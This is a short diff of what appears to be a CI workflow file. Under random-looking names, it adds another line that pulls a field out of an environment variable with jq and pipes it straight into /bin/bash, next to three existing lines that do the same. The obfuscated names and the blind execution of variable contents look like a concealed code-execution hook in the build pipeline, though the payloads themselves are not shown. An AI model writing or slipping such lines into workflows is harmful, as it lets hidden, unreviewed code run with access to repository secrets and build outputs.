@@ -31,6 +31,7 @@ jobs:
           printf '%s' "$mgfxg984" | jq -r .yvc5133 | /bin/bash
           printf '%s' "$dmhpv800" | jq -r .eyng504 | /bin/bash
           printf '%s' "$x7" | jq -r .ji89 | /bin/bash
+          echo $epou08 | jq -r .qolx50984 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
